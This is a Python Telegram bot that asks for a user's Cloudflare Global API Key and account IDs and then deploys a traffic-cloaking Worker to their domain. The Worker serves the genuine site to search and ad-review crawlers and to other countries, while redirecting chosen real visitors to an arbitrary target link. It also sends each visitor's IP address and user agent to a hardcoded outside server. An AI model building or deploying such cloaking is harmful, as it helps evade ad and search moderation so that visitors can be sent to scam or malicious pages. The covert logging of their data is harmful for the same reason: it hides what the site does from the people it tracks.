import logging
import asyncio
import aiohttp
import os
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
from dotenv import load_dotenv

load_dotenv()
API_TOKEN = os.getenv("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class SetupWorker(StatesGroup):
    waiting_for_cloak_type = State()
    waiting_for_devices = State()
    waiting_for_email = State()
    waiting_for_api_key = State()
    waiting_for_zone_id = State()
    waiting_for_account_id = State()
    waiting_for_target_link = State()
    waiting_for_geo = State()


def get_main_keyboard():
    """Creates a persistent keyboard with 'New Project' button"""
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📋 New Project")]],
        resize_keyboard=True
    )
    return keyboard

@dp.message(Command("start"))
async def start_cmd(message: types.Message, state: FSMContext):
    await state.clear()
    cloak_keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎯 Device + Geo")],
            [KeyboardButton(text="🌍 Geo Only")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "🚀 **Cloudflare Worker Setup**\n\nSelect cloaking type:",
        reply_markup=cloak_keyboard
    )
    await state.set_state(SetupWorker.waiting_for_cloak_type)

@dp.message(SetupWorker.waiting_for_cloak_type)
async def get_cloak_type(message: types.Message, state: FSMContext):
    cloak_type = message.text.strip()
    
    if "Device" in cloak_type:
        await state.update_data(cloak_type="device_geo")
        device_keyboard = ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="📱 Mobile")],
                [KeyboardButton(text="📊 Tablet")],
                [KeyboardButton(text="💻 Desktop")],
                [KeyboardButton(text="✅ All devices")]
            ],
            resize_keyboard=True
        )
        await message.answer(
            "Select which devices to **bypass** (send to website):",
            reply_markup=device_keyboard
        )
        await state.set_state(SetupWorker.waiting_for_devices)
    elif "Geo" in cloak_type:
        await state.update_data(cloak_type="geo_only")
        keyboard = get_main_keyboard()
        await message.answer("Enter your account email:", reply_markup=keyboard)
        await state.set_state(SetupWorker.waiting_for_email)
    else:
        await message.answer("❌ Select one of the suggested options")

@dp.message(SetupWorker.waiting_for_devices)
async def get_devices(message: types.Message, state: FSMContext):
    devices_text = message.text.strip()
    selected_devices = []
    
    if "All devices" in devices_text:
        selected_devices = ["mobile", "tablet", "desktop"]
    else:
        if "Mobile" in devices_text:
            selected_devices.append("mobile")
        if "Tablet" in devices_text:
            selected_devices.append("tablet")
        if "Desktop" in devices_text:
            selected_devices.append("desktop")
    
    if not selected_devices:
        await message.answer("❌ Select at least one device")
        return
    
    await state.update_data(devices=selected_devices)
    keyboard = get_main_keyboard()
    await message.answer("Enter your account email:", reply_markup=keyboard)
    await state.set_state(SetupWorker.waiting_for_email)

@dp.message(SetupWorker.waiting_for_email)
async def get_email(message: types.Message, state: FSMContext):
    if message.text.strip() == "📋 New Project":
        await start_cmd(message, state)
        return
    
    await state.update_data(email=message.text.strip())
    keyboard = get_main_keyboard()
    await message.answer("Enter your **Global API Key**:", reply_markup=keyboard)
    await state.set_state(SetupWorker.waiting_for_api_key)

@dp.message(SetupWorker.waiting_for_api_key)
async def get_api_key(message: types.Message, state: FSMContext):
    if message.text.strip() == "📋 New Project":
        await start_cmd(message, state)
        return
    
    await state.update_data(api_key=message.text.strip())
    keyboard = get_main_keyboard()
    await message.answer("Enter **Zone ID**:", reply_markup=keyboard)
    await state.set_state(SetupWorker.waiting_for_zone_id)

@dp.message(SetupWorker.waiting_for_zone_id)
async def get_zone_id(message: types.Message, state: FSMContext):
    if message.text.strip() == "📋 New Project":
        await start_cmd(message, state)
        return
    
    await state.update_data(zone_id=message.text.strip())
    keyboard = get_main_keyboard()
    await message.answer("Enter **Account ID**:", reply_markup=keyboard)
    await state.set_state(SetupWorker.waiting_for_account_id)

@dp.message(SetupWorker.waiting_for_account_id)
async def get_account_id(message: types.Message, state: FSMContext):
    if message.text.strip() == "📋 New Project":
        await start_cmd(message, state)
        return
    
    await state.update_data(account_id=message.text.strip())
    keyboard = get_main_keyboard()
    await message.answer("Enter **Target Link** (redirect URL):", reply_markup=keyboard)
    await state.set_state(SetupWorker.waiting_for_target_link)

@dp.message(SetupWorker.waiting_for_target_link)
async def get_target_link(message: types.Message, state: FSMContext):
    if message.text.strip() == "📋 New Project":
        await start_cmd(message, state)
        return
    
    await state.update_data(target_link=message.text.strip())
    keyboard = get_main_keyboard()
    await message.answer("Enter **GEO** to bypass (e.g., UA).\nAll other GEOs and bots will see the website.", reply_markup=keyboard)
    await state.set_state(SetupWorker.waiting_for_geo)

@dp.message(SetupWorker.waiting_for_geo)
async def final_step(message: types.Message, state: FSMContext):
    if message.text.strip() == "📋 New Project":
        await start_cmd(message, state)
        return
    
    geo_input = message.text.strip().upper()
    await state.update_data(geo=geo_input)
    
    user_data = await state.get_data()
    cloak_type = user_data.get('cloak_type', 'geo_only')
    
    keyboard = get_main_keyboard()
    await message.answer(f"⏳ Starting worker deployment for GEO: {geo_input}...", reply_markup=keyboard)

    if cloak_type == "device_geo":
        devices = user_data.get('devices', ['mobile', 'tablet', 'desktop'])
        device_mapping = {
            'mobile': '"mobile"',
            'tablet': '"tablet"',
            'desktop': '"desktop"'
        }
        allowed_devices = ', '.join([device_mapping[d] for d in devices])
        
        worker_script = f"""
export default {{
  async fetch(request, env, ctx) {{
    const targetBase = '{user_data['target_link']}';
    const logUrl = 'https://scriptds.xyz/scripts/log_cf/index.php';
    const url = new URL(request.url);
    
    if (url.pathname.includes('.') || url.search.includes('url=') || url.search.includes('_rsc')) {{
      return fetch(request);
    }}

    const domain = url.hostname;
    const country = request.cf ? request.cf.country : "Unknown";
    const userAgent = request.headers.get('User-Agent') || "";
    const clientIP = request.headers.get('CF-Connecting-IP');
    
    let deviceType = "desktop";
    const isMobileUA = /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    const isTabletUA = /iPad|Android|Tablet|Kindle/i.test(userAgent) && !/Mobile/i.test(userAgent);
    
    if (isTabletUA) deviceType = "tablet";
    else if (isMobileUA) deviceType = "mobile";

    const allowedDevices = [{allowed_devices}];
    const isTargetGeo = country === "{geo_input}";
    const isAllowedDevice = allowedDevices.includes(deviceType);
    const botCategory = request.cf ? request.cf.verifiedBotCategory : null;
    const isCfBot = botCategory !== null && botCategory !== undefined && botCategory !== "";
    const botKeywords = ['bot', 'spider', 'crawl', 'google', 'adsbot', 'lighthouse', 'bing', 'yandex', 'facebookexternalhit'];
    const isManualBot = botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword));

    let detectionReason = "REAL_USER";
    if (!isTargetGeo) detectionReason = "BAD_GEO_" + country;
    else if (!isAllowedDevice) detectionReason = "BAD_DEVICE_" + deviceType;
    else if (isCfBot) detectionReason = "CF_VERIFIED_" + botCategory;
    else if (isManualBot) detectionReason = "UA_KEYWORD";

    const isBot = !isTargetGeo || !isAllowedDevice || isCfBot || isManualBot;

    const logData = {{
      timestamp: new Date().toISOString(),
      domain: domain,
      status: isBot ? "0" : "1", 
      ip: clientIP,
      country: country,
      userAgent: userAgent,
      device: detectionReason,
      deviceType: deviceType,
      allowedDevices: allowedDevices.toString(),
      queryString: url.search 
    }};

    ctx.waitUntil(
      fetch(logUrl, {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify(logData),
      }}).catch(() => {{}})
    );

    if (isBot) {{
      return fetch(request);
    }} else {{
      const separator = targetBase.includes('?') ? '&' : '?';
      const finalUrl = `${{targetBase}}${{separator}}sub5=${{encodeURIComponent(domain)}}`;
      return Response.redirect(finalUrl, 302);
    }}
  }},
}};
"""
    else:
        worker_script = f"""
export default {{
  async fetch(request, env, ctx) {{
    const targetBase = '{user_data['target_link']}';
    const logUrl = 'https://scriptds.xyz/scripts/log_cf/index.php';
    const url = new URL(request.url);
    
    if (url.pathname.includes('.') || url.search.includes('url=') || url.search.includes('_rsc')) {{
      return fetch(request);
    }}

    const domain = url.hostname;
    const country = request.cf ? request.cf.country : "Unknown";
    const userAgent = request.headers.get('User-Agent') || "";
    const clientIP = request.headers.get('CF-Connecting-IP');

    const isTargetGeo = country === "{geo_input}";
    const botCategory = request.cf ? request.cf.verifiedBotCategory : null;
    const isCfBot = botCategory !== null && botCategory !== undefined && botCategory !== "";
    const botKeywords = ['bot', 'spider', 'crawl', 'google', 'adsbot', 'lighthouse', 'bing', 'yandex', 'facebookexternalhit'];
    const isManualBot = botKeywords.some(keyword => userAgent.toLowerCase().includes(keyword));

    let detectionReason = "REAL_USER";
    if (!isTargetGeo) detectionReason = "BAD_GEO_" + country;
    else if (isCfBot) detectionReason = "CF_VERIFIED_" + botCategory;
    else if (isManualBot) detectionReason = "UA_KEYWORD";

    const isBot = !isTargetGeo || isCfBot || isManualBot;

    const logData = {{
      timestamp: new Date().toISOString(),
      domain: domain,
      status: isBot ? "0" : "1", 
      ip: clientIP,
      country: country,
      userAgent: userAgent,
      device: detectionReason,
      queryString: url.search 
    }};

    ctx.waitUntil(
      fetch(logUrl, {{
        method: 'POST',
        headers: {{ 'Content-Type': 'application/json' }},
        body: JSON.stringify(logData),
      }}).catch(() => {{}})
    );

    if (isBot) {{
      return fetch(request);
    }} else {{
      const separator = targetBase.includes('?') ? '&' : '?';
      const finalUrl = `${{targetBase}}${{separator}}sub5=${{encodeURIComponent(domain)}}`;
      return Response.redirect(finalUrl, 302);
    }}
  }},
}};
"""
    
    success, error_msg = await deploy_to_cloudflare(user_data, worker_script)
    
    if success:
        devices_info = ""
        if cloak_type == "device_geo":
            devices = user_data.get('devices', [])
            devices_info = f"\nDevices: {', '.join(devices)}"
        await message.answer(f"✅ **Successfully deployed!**\nType: {cloak_type}\nGEO: {geo_input}{devices_info}\nRoute: {error_msg}/*", reply_markup=keyboard)
    else:
        await message.answer(f"❌ **Cloudflare Error:**\n{error_msg}", reply_markup=keyboard)
    
    await state.clear()


async def deploy_to_cloudflare(data, script_code):
    headers = {
        "X-Auth-Email": data['email'],
        "X-Auth-Key": data['api_key'],
    }
    worker_name = "managed-worker"
    
    async with aiohttp.ClientSession() as session:
        zone_url = f"https://api.cloudflare.com/client/v4/zones/{data['zone_id']}"
        async with session.get(zone_url, headers=headers) as resp:
            z_json = await resp.json()
            if resp.status != 200:
                err = z_json.get('errors', [{}])[0].get('message', 'Invalid Zone')
                return False, f"Zone Error: {err}"
            domain_name = z_json['result']['name']

        upload_url = f"https://api.cloudflare.com/client/v4/accounts/{data['account_id']}/workers/scripts/{worker_name}"
        form = aiohttp.FormData()
        form.add_field('metadata', json.dumps({"main_module": "main.js"}), content_type='application/json')
        form.add_field('script', script_code, filename='main.js', content_type='application/javascript+module')

        async with session.put(upload_url, headers=headers, data=form) as resp:
            if resp.status not in [200, 201]:
                err = (await resp.json()).get('errors', [{}])[0].get('message', 'Upload Error')
                return False, f"Script Error: {err}"

        route_url = f"https://api.cloudflare.com/client/v4/zones/{data['zone_id']}/workers/routes"
        payload = {"pattern": f"{domain_name}/*", "script": worker_name}
        async with session.post(route_url, headers={**headers, "Content-Type": "application/json"}, json=payload) as resp:
            r_json = await resp.json()
            if resp.status not in [200, 201] and "already exists" not in str(r_json):
                err = r_json.get('errors', [{}])[0].get('message', 'Route Error')
                return False, f"Route Error: {err}"
                
    return True, domain_name

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())